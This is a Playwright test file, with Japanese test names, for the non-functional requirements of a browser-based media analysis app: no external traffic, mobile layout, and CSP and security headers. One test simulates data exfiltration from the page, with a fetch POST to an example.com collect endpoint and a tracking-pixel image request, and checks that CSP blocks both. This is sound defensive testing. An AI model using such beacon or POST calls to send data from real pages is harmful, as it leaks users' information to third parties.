import { expect, test } from '@playwright/test';
import { analyze, chooseFile, holdForRecording } from './helpers';

test.describe('非機能要件', () => {
  test.afterEach(async ({ page }) => holdForRecording(page));

  test('TC-17 解析中に外部へのネットワーク通信が発生しない', async ({ page, baseURL }) => {
    const external: string[] = [];
    page.on('request', (req) => {
      const url = new URL(req.url());
      if (!['blob:', 'data:'].includes(url.protocol) && url.origin !== new URL(baseURL!).origin) external.push(req.url());
    });
    await page.goto('/');
    await chooseFile(page, 'ocean.webm');
    await analyze(page);
    await expect(page.getByTestId('spot-section')).toBeVisible();
    expect(external).toEqual([]);
  });

  test('TC-18 モバイル幅でも横スクロールせずに結果を表示できる', async ({ page }) => {
    await page.setViewportSize({ width: 375, height: 812 });
    await page.goto('/');
    await chooseFile(page, 'sunset.webp');
    await analyze(page);
    await page.getByTestId('spot-section').scrollIntoViewIfNeeded();
    const overflow = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    expect(overflow).toBeLessThanOrEqual(0);
  });

  test('TC-19 CSP とセキュリティヘッダーにより外部への送信が遮断される', async ({ page }) => {
    // CSP で遮断された通信も request イベントは発火するため、応答が返ったか（実際に送信されたか）で判定する
    const delivered: string[] = [];
    page.on('response', (r) => {
      if (r.url().startsWith('https://example.com')) delivered.push(r.url());
    });
    const res = await page.goto('/');
    const headers = res!.headers();
    expect(headers['content-security-policy']).toContain("frame-ancestors 'none'");
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['referrer-policy']).toBe('no-referrer');
    const meta = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    expect(meta).toContain("connect-src 'none'");

    await chooseFile(page, 'ocean.png');
    await analyze(page);
    // 解析後の画面から外部へ送信を試みても CSP で遮断される
    const blocked = await page.evaluate(async () => {
      const results: string[] = [];
      const violations: string[] = [];
      document.addEventListener('securitypolicyviolation', (e) => violations.push(e.violatedDirective));
      try {
        await fetch('https://example.com/collect', { method: 'POST', body: 'x' });
        results.push('fetch:sent');
      } catch {
        results.push('fetch:blocked');
      }
      const img = new Image();
      await new Promise<void>((resolve) => {
        img.onload = img.onerror = () => resolve();
        img.src = 'https://example.com/pixel.gif';
      });
      await new Promise((r) => setTimeout(r, 50));
      return { results, violations };
    });
    expect(blocked.results).toEqual(['fetch:blocked']);
    expect(blocked.violations).toEqual(expect.arrayContaining(['connect-src', 'img-src']));
    expect(delivered).toEqual([]);
  });
});
